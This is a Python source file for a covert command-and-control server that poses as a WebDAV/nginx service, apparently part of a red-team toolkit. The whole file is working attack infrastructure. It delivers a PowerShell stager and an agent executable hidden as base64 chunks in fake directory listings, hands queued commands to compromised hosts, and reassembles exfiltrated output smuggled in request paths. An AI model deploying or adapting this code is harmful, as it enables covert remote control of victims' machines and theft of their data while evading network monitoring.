# -*- coding: utf8 -*-

"""

The pseudo-webdav server

"""
from lib import helpers
from lib.stagers import GenStager

import socket
from threading import Thread, Event
import Queue
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO
from datetime import datetime

#------------------------------------------------------------------------
# Class handling WebDav request parsing
#------------------------------------------------------------------------
class WebDavRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message
        
#------------------------------------------------------------------------
# Class delivering the WebDavC2 server thread
#------------------------------------------------------------------------
class WebDavC2Server(Thread):

	#------------------------------------------------------------------------
	# Constructor
	def __init__(self, queue, readyEvent):
		Thread.__init__(self)
		self.queue = queue
		self.readyEvent = readyEvent
		self.resultChunk = ''
		
	#------------------------------------------------------------------------
	# Thread main function
	def run(self):

		serverName = self.queue.get()
		
		#------------------------------------------------------------------------
		# Setup a TCP server listening on port 80
		tcps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		tcps.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		tcps.bind(('',80))
		tcps.listen(1)
		print helpers.color("[*] Pseudo WebDav server listening on port 80")
		print helpers.color("[*] Waiting for an incoming agent to connect...")

		#------------------------------------------------------------------------
		# Main server loop
		try:
			while True:
				connection, clientAddr = tcps.accept()
				# print helpers.color("[+] Connection received from [{}]".format(clientAddr))
				try:
					
					
					# Receiving request - max size 4096 bytes - should fit any supported WebDav request
					data = connection.recv(4096)
					
					# [DEBUG BLOCK]
					#print helpers.color("[+] Data received:")
					#print helpers.color ("{}".format(data),'green')
					
					# Parsing the data received into a proper request object
					request = WebDavRequest(data)
					
					# If there's no error in parsing the data
					if not request.error_code:
					
						#--------- OPTIONS ---------
						if request.command == 'OPTIONS':
							response = self.optionsResponse()
							
						#--------- PROPFIND ---------
						if request.command == 'PROPFIND':
						
							if request.headers['Depth'] == '0':
								response = self.propfindResponse()
								
							elif request.headers['Depth'] == '1':
							
								#---- Stager is requesting the full powershell one liner
								if request.path.startswith('/oneliner'):
									oneLiner = GenStager.oneLiner({'serverName': serverName})
									response = self.propfindResponse(oneLiner)
									print helpers.color ("[+] Sending powershell one liner")
							
								#---- Stager is requesting the powershell encoded command only
								if request.path.startswith('/encoded'):
									encodedCommand = GenStager.encodedCommand({'serverName': serverName})
									# The data is already base64 encoded, so no need to encode it again, setting encode=False
									response = self.propfindResponse(encodedCommand, encode=False)
									print helpers.color ("[+] Sending powershell encoded command to the stager")
									
								#---- Stager is requesting the .Net assembly
								elif request.path.startswith('/agent'):
									try:
										with open('agent/agent.exe') as fileHandle:
											fileBytes = bytearray(fileHandle.read())
											fileHandle.close()
									except IOError:
										print helpers.color("[!] Could not open or read file [agent.exe]")
										quit()

									response = self.propfindResponse(fileBytes)
									print helpers.color ("[+] Sending agent binary (.Net assembly) to the stager")
																	
								#---- Agent is ready to execute commands	
								elif request.path.startswith('/r'):
									self.processResult(request.path)
									response = self.propfindResponse()
									
								#---- Agent probing for new commands to execute
								elif request.path.startswith('/getcommand'):
									# Check if we have a new command to be executed by the agent
									try:
										command = self.queue.get_nowait()
										response = self.propfindResponse(command)
									except Queue.Empty:
										response = self.propfindResponse()

						# [DEBUG BLOCK]
						#print helpers.color("[+] Sending response")
						#print helpers.color("{}".format(response),'green')
						connection.send(response)
				finally:
					connection.close()
		finally:
			print helpers.color("[!] Stopping WebDav Server")
			tcps.close()

	#------------------------------------------------------------------------
	def processResult(self, path):
		
		# Check if it's the last chunk of data
		if path[2:4] == '00':
			self.resultChunk += path[5:]
			self.resultChunk = self.resultChunk.replace('-','+').replace('_','/')

			# Set proper base64 padding back
			computePadding = len(self.resultChunk) % 4
			if computePadding == 2: self.resultChunk += '=='
			elif computePadding == 3: self.resultChunk += '='
			
			print helpers.b64decode(self.resultChunk)
			
			# Set the 'ready' event to let the main thread that the agent is ready to process new commands
			self.readyEvent.set()
			self.resultChunk = ''
		else:
			self.resultChunk += path[5:]
				
	#------------------------------------------------------------------------
	def optionsResponse(self):
		responseHeader = "HTTP/1.1 200 OK\r\n"
		responseHeader += "Server: nginx/1.6.2\r\n"
		responseHeader += "Date: {}\r\n".format(helpers.httpdate(datetime.now()))
		responseHeader += "Content-Length: 0\r\n"
		responseHeader += "DAV: 1\r\n"
		responseHeader += "Allow: GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS\r\n"
		responseHeader += "Proxy-Connection: Close\r\n"
		responseHeader += "Connection: Close\r\n"
		responseHeader += "Age: 0\r\n\r\n"
	
		return responseHeader

	#------------------------------------------------------------------------
	def propfindResponse(self, data=None, encode=True):

		# Get current time
		now = datetime.now().replace(microsecond=0)
	
		# Prepare the response's body
		body = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\r\n"
		body += "<D:multistatus xmlns:D=\"DAV:\">\r\n"
		body += "<D:response>\r\n"
		body += "<D:href>/</D:href>\r\n"
		body += "<D:propstat>\r\n"
		body += "<D:prop>\r\n"
		body += "<D:creationdate>{}</D:creationdate>\r\n".format(helpers.webdavdate(now))
		body += "<D:displayname></D:displayname>\r\n"
		body += "<D:getcontentlanguage/>\r\n"
		body += "<D:getcontentlength>4096</D:getcontentlength>\r\n"
		body += "<D:getcontenttype/>\r\n"
		body += "<D:getetag/>\r\n"
		body += "<D:getlastmodified>{}</D:getlastmodified>\r\n".format(helpers.httpdate(now))
		body += "<D:lockdiscovery/>\r\n"
		body += "<D:resourcetype><D:collection/></D:resourcetype>\r\n"
		body += "<D:source/>\r\n"
		body += "<D:supportedlock/>\r\n"
		body += "</D:prop>\r\n"
		body += "<D:status>HTTP/1.1 200 OK</D:status>\r\n"
		body += "</D:propstat>\r\n"
		body += "</D:response>\r\n"
	
		if data:
			encodedData = helpers.b64encode(data) if encode else data
			
			# Check if the encoded data contains special characters not suited for a 'Windows' filename
			if (encodedData.find('/') != -1):
				encodedData = encodedData.replace('/','_')
			chunks = list(helpers.chunks(encodedData, 250))
		
			i = 0
			for chunk in chunks:
				body += "<D:response>\r\n"
				body += "<D:href>/{}</D:href>\r\n".format(chunk)
				body += "<D:propstat>\r\n"
				body += "<D:prop>\r\n"
				body += "<D:creationdate>{}</D:creationdate>\r\n".format(helpers.webdavdate(now.replace(minute=(i%59))))
				body += "<D:displayname>{}</D:displayname>\r\n".format(chunk)
				body += "<D:getcontentlanguage/>\r\n"
				body += "<D:getcontentlength>0</D:getcontentlength>\r\n"
				body += "<D:getcontenttype/>\r\n"
				body += "<D:getetag/>\r\n"
				body += "<D:getlastmodified>{}</D:getlastmodified>\r\n".format(helpers.httpdate(now.replace(minute=(i%59))))
				body += "<D:lockdiscovery/>\r\n"
				body += "<D:resourcetype/>\r\n"
				body += "<D:source/>\r\n"
				body += "<D:supportedlock/>\r\n"
				body += "</D:prop>\r\n"
				body += "<D:status>HTTP/1.1 200 OK</D:status>\r\n"
				body += "</D:propstat>\r\n"
				body += "</D:response>\r\n"
				i+=1
	
		body += "</D:multistatus>\r\n"
	
		responseHeader = "HTTP/1.1 207 Multi-Status\r\n"
		responseHeader += "Server: nginx/1.6.2\r\n"
		responseHeader += "Date: {}\r\n".format(helpers.httpdate(datetime.now()))
		responseHeader += "Content-Length: {}\r\n".format(len(body))
		responseHeader += "Proxy-Connection: Keep-Alive\r\n"
		responseHeader += "Connection: Keep-Alive\r\n\r\n"
	
		return responseHeader + body
